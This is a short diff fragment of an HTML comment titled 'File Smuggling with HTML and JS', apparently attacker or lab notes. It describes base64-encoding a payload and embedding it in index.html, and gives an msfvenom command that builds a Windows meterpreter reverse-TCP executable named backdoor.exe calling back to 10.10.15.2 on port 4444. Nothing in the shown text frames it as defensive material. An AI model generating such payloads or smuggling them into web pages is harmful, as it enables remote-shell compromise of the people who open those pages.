@@ -1,4 +1,6 @@
 <!-- 
+File Smuggling with HTML and JS
+
 Create a payload and convert to base64, then embed in index.html
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.2 LPORT=4444 -f exe > backdoor.exe
